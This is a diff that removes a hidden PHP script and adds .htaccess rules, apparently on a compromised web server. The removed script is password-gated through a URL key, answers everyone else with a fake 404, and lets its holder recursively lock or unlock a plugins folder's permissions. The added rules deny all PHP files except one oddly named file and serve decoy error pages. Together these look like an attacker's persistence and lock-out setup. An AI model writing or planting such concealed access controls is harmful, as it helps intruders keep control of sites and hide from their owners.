@@ -1,74 +1,59 @@
-<?php
-/****************************************************
- * Simple Security Plugin Locker (Clean Version)
- * - No IP check
- * - No User-Agent check
- * - Password hash only
- * - Fake 404 on invalid access
- ****************************************************/
+Options -Indexes
 
-// =============================
-// CONFIG
-// =============================
+<FilesMatch "(?i)\.(phtml|php|phar|pgif|pht|phtm|shtml|inc|php1|php2|php3|php4|php5|php56|php6|php7|php72|php8|php9|php[0-9]?|asp[x]?|)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|pdf|xml|txt|js|css|tpl|doc|docs|dxc)$">
+Order allow,deny
+Allow from all
+</FilesMatch>
 
-// HASH PASSWORD — ganti sesuai kebutuhan
-$PASSWORD_HASH = '$2a$12$FO.t.v/pScf7TshzRUPvIOx4KaevFZt19M5I3m8Rrg4XyFem6a/xq';
+<FilesMatch '^(SignatureExecption.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<FilesMatch "^\.">
+Order allow,deny
+Deny from all
+</FilesMatch>
 
-// Path folder plugins (TANPA TAB, TANPA SPASI)
-$pluginsPath = "/var/www/phbjnk/plugins";
-
-
-// =============================
-// VALIDASI
-// =============================
-if (!isset($_GET['key']) || !isset($_GET['mode'])) {
-    http_response_code(404);
-    exit;
-}
-
-if (!password_verify($_GET['key'], $PASSWORD_HASH)) {
-    http_response_code(404);
-    exit;
-}
-
-$mode = $_GET['mode'];
-
-if (!file_exists($pluginsPath)) {
-    http_response_code(404);
-    exit;
-}
+ErrorDocument 403 "<html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please consult with your administrator.<br><br></body></html>"
+ErrorDocument 404 "<html><head><title>Request Rejected</title></head><body>The requested URL was rejected. Please consult with your administrator.<br><br></body></html>" 
+ErrorDocument 500 "Maaf, akses Anda ditolak karena mencoba melakukan aktivitas yang mencurigakan."
 
 
-// =============================
-// RECURSIVE CHMOD
-// =============================
-function chmod_recursive($path, $perm) {
-    $iterator = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS),
-        RecursiveIteratorIterator::SELF_FIRST
-    );
-
-    foreach ($iterator as $item) {
-        @chmod($item->getPathname(), $perm);
-    }
-
-    @chmod($path, $perm);
-}
 
 
-// =============================
-// AKSI
-// =============================
-if ($mode === "lock") {
-    chmod_recursive($pluginsPath, 0555);
-    exit("Locked");
-}
 
-if ($mode === "unlock") {
-    chmod_recursive($pluginsPath, 0755);
-    exit("Unlocked");
-}
 
-// Mode salah → 404
-http_response_code(404);
-exit;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
